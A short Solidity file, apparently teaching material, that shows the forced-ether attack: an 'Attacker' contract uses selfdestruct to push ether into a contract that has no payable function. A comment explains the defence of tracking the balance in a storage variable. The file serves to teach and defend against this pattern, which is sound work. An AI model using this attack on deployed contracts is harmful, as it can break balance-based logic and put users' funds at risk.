// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// if a contract does not have any payable function then we can send ether to that contract by using the
// selfdestruct() of any other contract

contract Attacker {
    function kill(address payable _contractAddress) external {
        // this function will remove this contracts data from blockchain and set the
        // address of this contract as 0x0000...
        selfdestruct(_contractAddress);
    }
}

// PREVENTION: -
// this type of attack can only possible on those contract which use the balance of
// contract as reference to lock some functionality
// and to save our contract for this, we can simply create a storage variable which
// tracks the balance of contract and use this variable in our functionality
